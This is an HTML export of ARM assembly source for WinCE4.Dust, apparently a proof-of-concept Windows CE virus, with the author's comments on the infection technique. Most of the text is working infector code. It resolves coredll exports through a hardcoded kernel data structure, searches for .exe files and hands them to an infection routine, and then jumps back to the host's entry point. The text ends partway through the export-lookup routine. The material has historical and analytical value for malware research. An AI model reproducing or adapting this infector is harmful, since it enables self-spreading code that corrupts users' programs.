<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; This series concludes with Ratter describing the creation of WinCE4.Dust.</span><span class="sc0">
</span><span class="sc1">; Techniques</span><span class="sc0">

</span><span class="sc1">; While programming WinCE4.Dust, I used time-tested techniques from the Win32 world. When infecting, the PE file is altered</span><span class="sc0">
</span><span class="sc1">; in the following way: The last section size is increased by the virus code size, and the virus body is copied at the end</span><span class="sc0">
</span><span class="sc1">; of the last section. Then the new EntryPoint is set; in other words, the pointer is set to the first instruction to</span><span class="sc0">
</span><span class="sc1">; execute when the program is loaded. This way, it's guaranteed that the virus will be run.</span><span class="sc0">

</span><span class="sc1">; Because Dust doesn't use the host's import section, it has to somehow obtain the needed API function addresses. This</span><span class="sc0">
</span><span class="sc1">; was the biggest problem to overcome, and finding the solution took some time. As soon as we have the function addresses,</span><span class="sc0">
</span><span class="sc1">; we use them to alter the victim's files found on the memory medium. Finding files to infect provides the standard function</span><span class="sc0">
</span><span class="sc1">; pair FindFirstFile and FindNextFile. Together with CreateFile, they differ from their Win32 counterparts, which appeared</span><span class="sc0">
</span><span class="sc1">; to be another minor problem.</span><span class="sc0">

</span><span class="sc1">; Every file gets mapped into memory, where later needed modifications are made. Windows CE introduced a new function,</span><span class="sc0">
</span><span class="sc1">; CreateFileForMapping, that has no equivalent on Win32. Without calling this function, there's no way to get the file handle</span><span class="sc0">
</span><span class="sc1">; that could be used to create the mapping object. On the other hand, the advantage of the ARM ISA appeared—the automatic</span><span class="sc0">
</span><span class="sc1">; generation of position-independent code. On Win32 x86, you had to determine its actual memory position and use this value</span><span class="sc0">
</span><span class="sc1">; later to modify absolute variable addresses (if the host's relocations were not altered, of course).</span><span class="sc0">

</span><span class="sc1">; The virus source code includes deeper comments of given problems and techniques. Please take the time to carefully read</span><span class="sc0">
</span><span class="sc1">; through the comments of this source code, in which I explain the Windows CE .NET security weakness that allowed me to create</span><span class="sc0">
</span><span class="sc1">; the first successful virus for this platform.</span><span class="sc0">

</span><span class="sc1">; From : http://www.informit.com/articles/article.asp?p=337071&amp;seqNum=3</span><span class="sc0">

</span><span class="sc1">;** virus_source **</span><span class="sc0">

  </span><span class="sc5">CODE32</span><span class="sc0">

   </span><span class="sc9">EXPORT</span><span class="sc0">  </span><span class="sc5">WinMainCRTStartup</span><span class="sc0">

   </span><span class="sc5">AREA</span><span class="sc0"> </span><span class="sc10">.text</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARM</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">

</span><span class="sc1">; r11 - base pointer</span><span class="sc0">
</span><span class="sc5">virus_code_start</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">stmdb</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">r12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">}
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">56</span><span class="sc0">     </span><span class="sc1">; make space on the stack</span><span class="sc0">

   </span><span class="sc1">; our stack space gets filled the following way</span><span class="sc0">
   </span><span class="sc1">;    #-56 - udiv</span><span class="sc0">
   </span><span class="sc1">;    #-52 - malloc</span><span class="sc0">
   </span><span class="sc1">;    #-48 - free</span><span class="sc0">
   </span><span class="sc1">; [r11, #-44] - CreateFileForMappingW</span><span class="sc0">
   </span><span class="sc1">;    #-40 - CloseHandle</span><span class="sc0">
   </span><span class="sc1">;    #-36 - CreateFileMappingW</span><span class="sc0">
   </span><span class="sc1">;    #-32 - MapViewOfFile</span><span class="sc0">
   </span><span class="sc1">;    #-28 - UnmapViewOfFile</span><span class="sc0">
   </span><span class="sc1">;    #-24 - FindFirstFileW</span><span class="sc0">
   </span><span class="sc1">;    #-20 - FindNextFileW</span><span class="sc0">
   </span><span class="sc1">;    #-16 - FindClose</span><span class="sc0">
   </span><span class="sc1">;    #-12 - MessageBoxW</span><span class="sc0">

   </span><span class="sc1">;    #- 8 - filehandle</span><span class="sc0">
   </span><span class="sc1">;    #- 4 - mapping handle</span><span class="sc0">

   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">get_export_section</span><span class="sc0">

   </span><span class="sc1">; we'll import via ordinals, not function names, because it's</span><span class="sc0">
   </span><span class="sc1">; safe - even linker does that</span><span class="sc0">

   </span><span class="sc5">adr</span><span class="sc0">   </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">import_ordinals</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">lookup_imports</span><span class="sc0">

   </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">ask_user</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">jmp_to_host</span><span class="sc0">     </span><span class="sc1">; are we allowed to spread?</span><span class="sc0">
   </span><span class="sc1">;</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x23</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">52</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; allocate WFD</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">jmp_to_host</span><span class="sc0">

   </span><span class="sc1">; in the following code I use functions FindFirstFile/FindNextFile</span><span class="sc0">
   </span><span class="sc1">; for finding *.exe files in the current directory. But in this</span><span class="sc0">
   </span><span class="sc1">; case I made a big mistake. I didn't realize that WinCE is not</span><span class="sc0">
   </span><span class="sc1">; aware of the current directory and thus we need to use absolute</span><span class="sc0">
   </span><span class="sc1">; pathnames. That's why this code won't find files in the current</span><span class="sc0">
   </span><span class="sc1">; directory, but rather always in root directory. I found this out when I</span><span class="sc0">
   </span><span class="sc1">; was performing final tests, but because the aim was to create a</span><span class="sc0">
   </span><span class="sc1">; proof-of-concept code and because the infection itself was already</span><span class="sc0">
   </span><span class="sc1">; limited by the user's permission, I decided not to correct this</span><span class="sc0">
   </span><span class="sc1">; bug</span><span class="sc0">

   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">mask</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; find first file</span><span class="sc0">
   </span><span class="sc5">cmn</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">free_wfd</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r0</span><span class="sc0">
</span><span class="sc5">find_files_iterate</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; filesize high</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; filesize low</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; file too big?</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">find_next_file</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0x1000</span><span class="sc0">      </span><span class="sc1">; file smaller than 4096 bytes?</span><span class="sc0">
   </span><span class="sc5">addgt</span><span class="sc0">   </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">40</span><span class="sc0">      </span><span class="sc1">; gimme file name</span><span class="sc0">
   </span><span class="sc5">blgt</span><span class="sc0">   </span><span class="sc5">infect_file</span><span class="sc0">

</span><span class="sc5">find_next_file</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; find next file</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; is there any left?</span><span class="sc0">
   </span><span class="sc5">bne</span><span class="sc0">    </span><span class="sc5">find_files_iterate</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">free_wfd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc4">-</span><span class="sc2">48</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; free WFD</span><span class="sc0">
   </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">jmp_to_host</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">host_ep</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get host_entry</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get pc</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r2</span><span class="sc0">       </span><span class="sc1">; add displacement</span><span class="sc0">
   </span><span class="sc6">str</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r11</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">56</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; store it back</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r11</span><span class="sc0">
   </span><span class="sc5">ldmia</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">r12</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pc</span><span class="sc0">}
   </span><span class="sc9">ENDP</span><span class="sc0">

   </span><span class="sc1">; we're looking for *.exe files</span><span class="sc0">
</span><span class="sc9">mask</span><span class="sc0">   </span><span class="sc5">DCB</span><span class="sc0">    </span><span class="sc3">"*"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"x"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"e"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0x0</span><span class="sc0">

   </span><span class="sc1">; host entry point displacement</span><span class="sc0">
   </span><span class="sc1">; in first generation let compiler count it</span><span class="sc0">
</span><span class="sc5">host_ep</span><span class="sc0">
   </span><span class="sc5">DCD</span><span class="sc0">    </span><span class="sc5">host_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">virus_code_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

   </span><span class="sc1">; WinCE is a UNICODE-only platform and thus we'll use the W ending</span><span class="sc0">
   </span><span class="sc1">; for api names (there are no ANSI versions of these)</span><span class="sc0">

</span><span class="sc5">import_ordinals</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">2008</span><span class="sc0">       </span><span class="sc1">; udiv</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">1041</span><span class="sc0">       </span><span class="sc1">; malloc</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">1018</span><span class="sc0">       </span><span class="sc1">; free</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">1167</span><span class="sc0">       </span><span class="sc1">; CreateFileForMappingW</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">553</span><span class="sc0">        </span><span class="sc1">; CloseHandle</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">548</span><span class="sc0">        </span><span class="sc1">; CreateFileMappingW</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">549</span><span class="sc0">        </span><span class="sc1">; MapViewOfFile</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">550</span><span class="sc0">        </span><span class="sc1">; UnmapViewOfFile</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">167</span><span class="sc0">        </span><span class="sc1">; FindFirstFileW</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">181</span><span class="sc0">        </span><span class="sc1">; FindNextFile</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">180</span><span class="sc0">        </span><span class="sc1">; FindClose</span><span class="sc0">
   </span><span class="sc5">DCW</span><span class="sc0">    </span><span class="sc2">858</span><span class="sc0">        </span><span class="sc1">; MessageBoxW</span><span class="sc0">

   </span><span class="sc5">DCD</span><span class="sc0">    </span><span class="sc2">0x0</span><span class="sc0">

   </span><span class="sc1">; basic wide string compare</span><span class="sc0">
</span><span class="sc5">wstrcmp</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc5">wstrcmp_iterate</span><span class="sc0">
   </span><span class="sc5">ldrh</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r0</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc5">ldrh</span><span class="sc0">    </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r1</span><span class="sc4">],</span><span class="sc0"> #</span><span class="sc2">2</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">cmpeq</span><span class="sc0">   </span><span class="sc5">r3</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">moveq</span><span class="sc0">   </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc5">r2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r3</span><span class="sc0">
   </span><span class="sc5">beq</span><span class="sc0">    </span><span class="sc5">wstrcmp_iterate</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">pc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">
   </span><span class="sc9">ENDP</span><span class="sc0">

   </span><span class="sc1">; on theWin32 platform, almost all important functions were located in the</span><span class="sc0">
   </span><span class="sc1">; kernel32.dll library (and if they weren't, the LoadLibrary/GetProcAddresss pair</span><span class="sc0">
   </span><span class="sc1">; was). The first infectors had a hardcoded imagebase of this dll and</span><span class="sc0">
   </span><span class="sc1">; later they imported needed functions by hand from it. This</span><span class="sc0">
   </span><span class="sc1">; turned out to be incompatible because different Windows versions might</span><span class="sc0">
   </span><span class="sc1">; have different imagebases for kernel32. That's why more or less</span><span class="sc0">
   </span><span class="sc1">; sophisticated methods were found that allowed coding in a</span><span class="sc0">
   </span><span class="sc1">; compatible way. One of these methods is scanning memory for known values</span><span class="sc0">
   </span><span class="sc1">; located in PE file header ("MZ") if the address inside the module is</span><span class="sc0">
   </span><span class="sc1">; given. Because the function inside kernel32 calls the EntryPoint of</span><span class="sc0">
   </span><span class="sc1">; every Win32 process, we've got this address. Then comparing the word</span><span class="sc0">
   </span><span class="sc1">; on and aligned address (and decrementing it) against known values is</span><span class="sc0">
   </span><span class="sc1">; enough to locate the imagebase. If this routine is even covered</span><span class="sc0">
   </span><span class="sc1">; with SEH (Structured Exception Handling) everything is safe.</span><span class="sc0">

   </span><span class="sc1">; I wanted to use this method on WinCE too, but I hit the wall.</span><span class="sc0">
   </span><span class="sc1">; Probably to save memory space, there are no headers</span><span class="sc0">
   </span><span class="sc1">; before the first section of the loaded module. There is thus no</span><span class="sc0">
   </span><span class="sc1">; "MZ" value and scanning cannot be used even we have the address</span><span class="sc0">
   </span><span class="sc1">; inside coredll.dll (lr registr on our entrypoint). Moreover, we</span><span class="sc0">
   </span><span class="sc1">; cannot use SEH either, because SEH handlers get installed with</span><span class="sc0">
   </span><span class="sc1">; the help of a special directory (the exception directory) in the PE file and</span><span class="sc0">
   </span><span class="sc1">; some data before the function starts - this information would have</span><span class="sc0">
   </span><span class="sc1">; to be added while infecting the victim (the exception directory</span><span class="sc0">
   </span><span class="sc1">; would have to be altered) which is of course not impossible -- just</span><span class="sc0">
   </span><span class="sc1">; a little bit impractical to implement in our basic virus.</span><span class="sc0">

   </span><span class="sc1">; That's why I was forced to use a different approach. I looked</span><span class="sc0">
   </span><span class="sc1">; through the Windows CE 3.0 source code (shared source,</span><span class="sc0">
   </span><span class="sc1">; downloadable from Microsoft) and tried to find out how the loader</span><span class="sc0">
   </span><span class="sc1">; performs its task. The Loader needs the pointer to the module's export</span><span class="sc0">
   </span><span class="sc1">; section and its imagebase to be able to import from it. The result was a</span><span class="sc0">
   </span><span class="sc1">; KDataStruct at a hardcoded address accessible from user mode (why Microsoft</span><span class="sc0">
   </span><span class="sc1">; chose to open this loophole, I don't know)</span><span class="sc0">
   </span><span class="sc1">; and mainly it's item aInfo[KINX_MODULES] which is a pointer to a</span><span class="sc0">
   </span><span class="sc1">; list of Module structures. There we can find all needed values</span><span class="sc0">
   </span><span class="sc1">; (name of the module, imagebase and export section RVA). In the</span><span class="sc0">
   </span><span class="sc1">; code that follows I go through this one-way list and look for</span><span class="sc0">
   </span><span class="sc1">; structure describing the coredll.dll module. From this structure I</span><span class="sc0">
   </span><span class="sc1">; get the imagebase and export section RVA (Relative Virtual Address).</span><span class="sc0">

   </span><span class="sc1">; what sounds relatively easy was in the end more work than I</span><span class="sc0">
   </span><span class="sc1">; expected. The problem was to get the offsets in the Module</span><span class="sc0">
   </span><span class="sc1">; structure. The source code and corresponding headers I had were for</span><span class="sc0">
   </span><span class="sc1">; Windows CE 3.0, but I was writing for Windows CE 4.2 (Windows Mobile 2003),</span><span class="sc0">
   </span><span class="sc1">; where the structure is different. I worked it out using the following</span><span class="sc0">
   </span><span class="sc1">; sequence:</span><span class="sc0">
   </span><span class="sc1">; I was able to get the imagebase offset using the trial-and-error</span><span class="sc0">
   </span><span class="sc1">; method - I used the debugger and tried values inside the</span><span class="sc0">
   </span><span class="sc1">; structure that looked like valid pointers. If there was something</span><span class="sc0">
   </span><span class="sc1">; interesting, I did some memory sniffing to realize where I was.</span><span class="sc0">
   </span><span class="sc1">; The export section pointer was more difficult. There is no real</span><span class="sc0">
   </span><span class="sc1">; pointer, just the RVA instead. Adding the imagebase to RVA gives us the</span><span class="sc0">
   </span><span class="sc1">; pointer. That's why I found coredll.dll in memory - namely the</span><span class="sc0">
   </span><span class="sc1">; list of function names in export section that the library exports.</span><span class="sc0">
   </span><span class="sc1">; This list is just a series of ASCIIZ names (you can see this list</span><span class="sc0">
   </span><span class="sc1">; when opening the dll in your favourite hex editor). At the</span><span class="sc0">
   </span><span class="sc1">; beginning of this list there must be a dll name (in this case</span><span class="sc0">
   </span><span class="sc1">; coredll.dll) to which a RVA in the export section header</span><span class="sc0">
   </span><span class="sc1">; points. Substracting the imagebase from the address where the dll</span><span class="sc0">
   </span><span class="sc1">; name starts gave me an RVA of the dll name. I did a simple byte</span><span class="sc0">
   </span><span class="sc1">; search for the byte sequence that together made this RVA value. This</span><span class="sc0">
   </span><span class="sc1">; showed me where the (Export Directory Table).Name Rva is.</span><span class="sc0">
   </span><span class="sc1">; Because this is a known offset within a known structure (which is</span><span class="sc0">
   </span><span class="sc1">; in the beginning of export section), I was able to get</span><span class="sc0">
   </span><span class="sc1">; the export section pointer this way. I again substracted the imagebase to</span><span class="sc0">
   </span><span class="sc1">; get the export section RVA. I looked up this value in the coredll's</span><span class="sc0">
   </span><span class="sc1">; Module structure, which finally gave me the export section RVA</span><span class="sc0">
   </span><span class="sc1">; offset.</span><span class="sc0">

   </span><span class="sc1">; this works on Pocket PC 2003; it works on</span><span class="sc0">
   </span><span class="sc1">; my wince 4.20.0 (build 13252).</span><span class="sc0">
   </span><span class="sc1">; On different versions the structure offsets might be different :-/</span><span class="sc0">

</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;  r0 - coredll base addr</span><span class="sc0">
</span><span class="sc1">;  r1 - export section addr</span><span class="sc0">
</span><span class="sc5">get_export_section</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
   </span><span class="sc5">stmdb</span><span class="sc0">   </span><span class="sc8">sp</span><span class="sc0">!</span><span class="sc4">,</span><span class="sc0"> {</span><span class="sc5">r4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">r9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lr</span><span class="sc0">}

   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0xffffc800</span><span class="sc0">   </span><span class="sc1">; KDataStruct</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc2">0x324</span><span class="sc0">     </span><span class="sc1">; aInfo[KINX_MODULES]</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r5</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">; r5 now points to first module</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">r5</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc5">r7</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">iterate</span><span class="sc0">
   </span><span class="sc5">ldr</span><span class="sc0">    </span><span class="sc5">r0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r6</span><span class="sc4">,</span><span class="sc0"> #</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get dll name</span><span class="sc0">
   </span><span class="sc5">adr</span><span class="sc0">    </span><span class="sc5">r1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">coredll</span><span class="sc0">
   </span><span class="sc8">bl</span><span class="sc0">    </span><span class="sc5">wstrcmp</span><span class="sc0">        </span><span class="sc1">; compare with coredll.dll</span><span class="sc0">

